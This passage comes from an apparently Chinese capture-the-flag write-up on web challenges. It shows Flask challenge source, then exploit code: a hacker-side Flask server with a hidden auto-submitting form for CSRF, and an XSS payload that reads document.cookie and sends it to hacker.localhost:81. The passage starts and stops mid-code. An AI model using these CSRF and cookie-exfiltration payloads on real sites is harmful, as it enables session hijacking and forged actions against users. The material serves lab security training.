punctuation">,</span> <span class="token string">"Not logged in"</span>        db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"UPDATE users SET leak = TRUE WHERE rowid = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Leaked\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/info"</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token string">"user"</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">,</span> <span class="token string">"Missing `user` argument"</span>        user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `user`"</span>        info <span class="token operator">=</span> <span class="token punctuation">[</span>user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">"leak"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            info<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> hacker_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>hacker_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">/login"</span></span><span class="token punctuation">)</span>            user_form <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> flag<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> user_form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> name<span class="token punctuation">)</span>                field<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            submit_field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">)</span>            submit_field<span class="token punctuation">.</span>submit<span class="token punctuation">(</span><span class="token punctuation">)</span>            WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>staleness_of<span class="token punctuation">(</span>submit_field<span class="token punctuation">)</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Visited\n"</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">服务器：<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token keyword">import</span> requests<span class="token keyword">import</span> http<span class="token punctuation">.</span>clientapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建一个访问challenge.localhost的请求</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>    <span class="token comment"># challenge_url = "http://challenge.localhost/leak"</span>    <span class="token comment"># return redirect(challenge_url)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/leak'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 创建一个访问challenge.localhost的请求</span>    challenge_url <span class="token operator">=</span> <span class="token string">"http://challenge.localhost/leak"</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>challenge_url<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"test"</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"hacker.localhost"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">81</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网页:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>My Flask App<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to My Flask App!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>This is a simple example of a rendered HTML page using Flask.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myForm<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://challenge.localhost/leak<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>value<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myButton<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> button <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myButton'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        button<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'myForm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://hacker.localhost:81/leak'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token literal-property property">redirect</span><span class="token operator">:</span> <span class="token string">'manual'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 自动触发按钮点击事件</span>      button<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你的js代码写成这样，会出现跨域的问题</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://hacker.localhost:81/leak'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token literal-property property">redirect</span><span class="token operator">:</span> <span class="token string">'manual'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> redirectUrl <span class="token operator">=</span> <span class="token string">"http://challenge.localhost/leak"</span><span class="token punctuation">;</span>      <span class="token comment">// 发送 POST 请求到重定向的目标 URL</span>      <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>redirectUrl<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>这个题跟之前的很像，只不过现在没有leak函数了。需要拿到session作为cookie传递过去，才能获得正确的flag。</p><p>有两种做法</p><ol><li>原网页存在xss漏洞，我们可以利用xss payload获取cookie，将cookie传递到hacker.localhost机器上去。然后再带着cookie访问challenge.localhost的info接口</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707101602.png" alt="20240707101602"></p><ol start="2"><li>将传递给echo接口的payload设置为先利用fetch请求challenge.localhost的info接口（<strong>由于同源会自带cookie访问</strong>），然后将接口响应放在Authorization字段里传递给hacker。</li></ol><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240707101549.png" alt="20240707101549"></p><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">level13</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SESSION_COOKIE_HTTPONLY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>    db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"CREATE TABLE IF NOT EXISTS users AS "</span>                <span class="token string">'SELECT "flag" AS username, ? as password'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               <span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>            password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> username<span class="token punctuation">,</span> <span class="token string">"Missing `username` form"</span>            <span class="token keyword">assert</span> password<span class="token punctuation">,</span> <span class="token string">"Missing `password` form"</span>            user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"SELECT rowid, * FROM users WHERE username = ? AND password = ?"</span></span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">assert</span> user<span class="token punctuation">,</span> <span class="token string">"Invalid `username` or `password`"</span>            session<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>user<span class="token punctuation">[</span><span class="token string">"rowid"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>        <span class="token keyword">return</span> form<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/info"</span><span class="token punctuation">:</span>        session_user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        session_user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>session_user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        request_user_id <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> session_user_id<span class="token punctuation">)</span><span class="token punctuation">)</span>        request_user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT * FROM users WHERE rowid = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request_user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> request_user<span class="token punctuation">,</span> <span class="token string">"Invalid `user`"</span>        info <span class="token operator">=</span> <span class="token punctuation">[</span>request_user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> request_user_id <span class="token operator">==</span> session_user_id<span class="token punctuation">:</span>            info<span class="token punctuation">.</span>append<span class="token punctuation">(</span>request_user<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>info<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/visit"</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> url<span class="token punctuation">,</span> <span class="token string">"Missing `url` argument"</span>        url_arg_parsed <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">assert</span> url_arg_parsed<span class="token punctuation">.</span>hostname <span class="token operator">==</span> challenge_host<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Invalid `url`, hostname should be `</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">`"</span></span>        <span class="token keyword">with</span> run_browser<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> browser<span class="token punctuation">:</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>challenge_host<span class="token punctuation">&#125;</span></span><span class="token string">/login"</span></span><span class="token punctuation">)</span>            user_form <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> flag<span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> name<span class="token punctuation">,</span> value <span class="token keyword">in</span> user_form<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>NAME<span class="token punctuation">,</span> name<span class="token punctuation">)</span>                field<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            submit_field <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>ID<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">)</span>            submit_field<span class="token punctuation">.</span>submit<span class="token punctuation">(</span><span class="token punctuation">)</span>            WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>staleness_of<span class="token punctuation">(</span>submit_field<span class="token punctuation">)</span><span class="token punctuation">)</span>            browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Visited\n"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/echo"</span><span class="token punctuation">:</span>        echo <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span>        <span class="token keyword">assert</span> echo<span class="token punctuation">,</span> <span class="token string">"Missing `echo` argument"</span>        <span class="token keyword">return</span> html<span class="token punctuation">(</span>echo<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用源码</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">方法1：    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        all <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://hacker.localhost:81/'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>            <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>            <span class="token literal-property property">headers</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">"Authorization"</span><span class="token operator">:</span> all            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    </span></span><span class="token 